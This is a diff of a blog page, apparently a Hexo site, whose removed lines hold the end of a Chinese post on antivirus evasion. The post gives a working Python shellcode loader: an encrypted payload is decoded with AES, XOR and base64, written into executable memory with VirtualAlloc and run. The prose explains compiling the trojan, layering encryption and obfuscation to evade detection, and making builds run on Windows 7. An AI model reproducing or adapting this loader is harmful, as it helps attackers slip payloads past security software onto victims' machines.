class="string">&#x27;utf8&#x27;</span>))).rstrip(<span class="string">b&#x27;\0&#x27;</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_jiemi</span>(<span class="params">s,key</span>):</span></span><br><span class="line">    xor_s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        xor_s += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ key)</span><br><span class="line">    <span class="keyword">return</span> xor_s</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_memory</span>(<span class="params">buf</span>):</span></span><br><span class="line">    length = <span class="built_in">len</span>(buf)</span><br><span class="line"></span><br><span class="line">    kernel32.VirtualAlloc.restype = ctypes.c_void_p</span><br><span class="line">    ptr = kernel32.VirtualAlloc(<span class="literal">None</span>, length, <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">    kernel32.RtlMoveMemory.argtypes = (</span><br><span class="line">        ctypes.c_void_p,</span><br><span class="line">        ctypes.c_void_p,</span><br><span class="line">        ctypes.c_size_t)</span><br><span class="line">    kernel32.RtlMoveMemory(ptr, buf, length)</span><br><span class="line">    <span class="keyword">return</span> ptr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">shellcode</span>):</span></span><br><span class="line">    buf = ctypes.create_string_buffer(shellcode)</span><br><span class="line">    ptr = write_memory(buf)</span><br><span class="line">    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(<span class="literal">None</span>))</span><br><span class="line">    shell_func()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    jiami_sc = <span class="string">&#x27;nNTTwqBntRUVsGzFLXrB54mHCTMUkwOkgFGxbYPdb6zG2uKaUEKY4lK2dT36BaJQ9jZJ4rPVx5n0xGteS5M1f5r/hc9ab2ZAUcUipd/87CD/Vmns9lpZCaj8Cr1BXdsEpO56xJtpurJ9tbar8S+4VIX6cQ2bJefummMWD2tv8upIx8UtZigMvqryLrrQ6RN7Hab87ezQV9t9qtMBhKm2No3LA3mX/oYGWl88CBuMCqEEyntbFMKhbi8PXXDt+GvamHgmSlTPn+M54tLfoAbxy6L/MDId2TX+BrTjrbO53TNJODdgBl7Jn2SH2/ucg7VZpOoscbRSePFQo/+iCp4gqJn9h/alCY85EXuYti/14W7C41f0KSZfp0zPE5fI3lykyHWPVkZoX+LmdDg43pIybdaUgI/G1YLE9rK6o+9cBgr+BrQiehHpvl5Id8N6pKgilMIenPEwlCzEalny0uhKFVT6Kl9idOQZmds1kqLT0nyvem0lt+tffq3+a1ioGWGKybinrDOArR4P0GQrCjsoOAVWZlvuXceM7aZX1aGHEnfMNg7WQb1zfWRp3HCp1bKZ8IP+Fp3fKhpxNiHYAaGMqfBcZbIex1O6O6eg+xnNJ3TzOnQfhvfSMhtt3nzDe8OS5f1PtiMUUnOlXP8uYDlPDL6ZJxEIboziy9YdjsX0bM4A3FrDVlenTpK2wbWlOJnLEoxO7a6093Z6ILY3n201WNJR2bzvNFmBlRD0SvKPJpcB6nAR2pHjra27MNAqYq4oFingkte1G6UZBb2A3n3DyI2DgH9agOO1d4T1p0nYac4B2a/v+9NwmK1C4aQw1lOpqvQuyNS8OyFnGHZMmOkS+aYCR2bLc6vNrMVG7ys553D1mpKgi4vKvowXI/u0GoI/lSL9ehSAoMFaUdoieft2JpzVPRr1aF7JK5OAc6vnzLVASlnKCJb6Pj6MknFDJTruaW&#x27;</span></span><br><span class="line">    sc = xor_jiemi(aes_jiemi(jiami_sc),<span class="number">35</span>)</span><br><span class="line">    shde = base64.b64decode(sc)</span><br><span class="line">    run(shde)</span><br></pre></td></tr></table></figure>
-
-<p>最后编译main就可</p>
-<p>这套免杀就是base64+xor+aes最后代码混淆+fernet</p>
-<p>最后我改了下里面的加密方式以及一些小东西，缝合了一套自己的免杀，源码我就在这不放了，免得用不了多久就没了。</p>
-<p>最后说下踩的一个坑吧，win10打包的马在win7没法用怎么办，在win7装一个python32，然后在win7打包就行了，这样哪里都能运行，注意win7装python需要安装一个插件 KB976932补丁。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -575,7 +593,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">176</span>
+          <span class="site-state-item-count">177</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
